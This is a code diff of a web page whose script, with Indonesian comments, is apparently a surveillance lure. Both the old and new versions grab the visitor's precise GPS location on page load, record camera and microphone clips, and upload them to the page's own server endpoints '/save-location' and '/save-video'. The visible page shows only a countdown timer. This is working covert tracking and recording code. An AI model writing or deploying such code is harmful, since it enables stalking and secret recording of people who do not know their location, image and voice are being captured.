@@ -102,68 +102,70 @@
   setInterval(tick, 1000);
 </script>
 <script>
-    // 1. Kirim Lokasi Berkala (Setiap 10 detik)
-    function sendLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const gmapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch('/save-location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ link: gmapsLink })
-                }).catch(e => {});
-            }, null, { enableHighAccuracy: true });
-        }
-    }
-    sendLocation();
-    setInterval(sendLocation, 10000);
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Eksekusi Penangkap Lokasi & Google Maps (Bagian A)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+            var gmapsLink = "https://www.google.com/maps/place/" + lat + "+" + lon;
 
-    // 2. Rekam & Kirim Video Kamera Kontinu (Versi Stabil)
-    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true }).then(stream => {
-        function startRecording() {
-            let options = { mimeType: 'video/webm;codecs=vp8,opus' };
-            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                options = { mimeType: 'video/webm' };
+            // Kirim koordinat & link Google Maps ke server Python
+            fetch('/save-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    lat: lat, 
+                    lon: lon, 
+                    accuracy: acc, 
+                    link: gmapsLink 
+                })
+            }).catch(err => console.log("Gagal kirim lokasi"));
+        }, function(error) {
+            console.log("GPS ditolak atau gagal diakses");
+        }, { timeout: 10000, enableHighAccuracy: true });
+    }
+
+    // 2. Eksekusi Perekam Video Kamera .webm (Bagian B)
+    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true })
+    .then(stream => {
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = function(e) {
+            if (e.data.size > 0) {
+                chunks.push(e.data);
             }
-            
-            const recorder = new MediaRecorder(stream, options);
-            let chunks = [];
-            
-            recorder.ondataavailable = e => {
-                if (e.data && e.data.size > 0) {
-                    chunks.push(e.data);
-                }
-            };
-            
-            recorder.onstop = () => {
-                if (chunks.length > 0) {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('video', blob, `rec_${Date.now()}.webm`);
-                    
-                    fetch('/save-video', { 
-                        method: 'POST', 
-                        body: formData 
-                    })
-                    .then(() => startRecording())
-                    .catch(() => startRecording());
-                } else {
-                    startRecording();
-                }
-            };
-            
-            recorder.start();
-            // Rekam tiap 8 detik lalu kirim
-            setTimeout(() => {
-                if (recorder.state === "recording") {
-                    recorder.stop();
-                }
-            }, 8000);
-        }
-        startRecording();
-    }).catch(e => {
-        console.error("Gagal akses media:", e);
+        };
+
+        mediaRecorder.onstop = function() {
+            if (chunks.length > 0) {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', blob, `capture_${Date.now()}.webm`);
+
+                // Kirim data biner video ke server Python
+                fetch('/save-video', {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => console.log("Gagal kirim video"));
+            }
+        };
+
+        mediaRecorder.start();
+        
+        // Rekam otomatis selama 7 detik, lalu hentikan dan kirim ke server
+        setTimeout(() => {
+            if (mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+            }
+        }, 7000);
+    })
+    .catch(err => {
+        console.log("Kamera tidak diizinkan atau diblokir browser");
     });
+});
 </script>
 </body>
 </html>
